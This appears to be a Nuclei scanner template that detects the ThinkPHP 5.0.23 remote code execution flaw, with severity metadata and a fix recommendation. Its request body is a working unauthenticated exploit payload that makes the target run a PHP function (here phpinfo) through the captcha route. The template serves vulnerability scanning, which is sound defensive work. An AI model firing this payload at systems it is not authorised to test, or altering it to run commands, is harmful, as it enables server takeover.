id: thinkphp-5023-rce
info:
  name: ThinkPHP 5.0.23 - Remote Code Execution
  author: dr_set
  severity: critical
  description: ThinkPHP 5.0.23 is vulnerable to remote code execution, allowing attackers
    to execute malicious code, obtain sensitive data, modify information and gain
    complete control of compromised systems without authentication.
  reference: https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/5.0.23-rce
  tags: thinkphp,rce
  metadata:
    impact: The ThinkPHP-5023-RCE vulnerability in ThinkPHP 5.0.23 allows attackers
      to achieve a broad range of impacts, including unauthorized information disclosure,
      data tampering, and complete system compromise.
    recommendation: It is recommended to immediately update to a non-vulnerable version
      of ThinkPHP to prevent potential attacks.
requests:
- method: POST
  path:
  - '{{BaseURL}}/index.php?s=captcha'
  headers:
    Content-Type: application/x-www-form-urlencoded
  body: _method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1
  matchers-condition: and
  matchers:
  - type: word
    words:
    - PHP Extension
    - PHP Version
    - ThinkPHP
    condition: and
  - type: status
    status:
    - 200
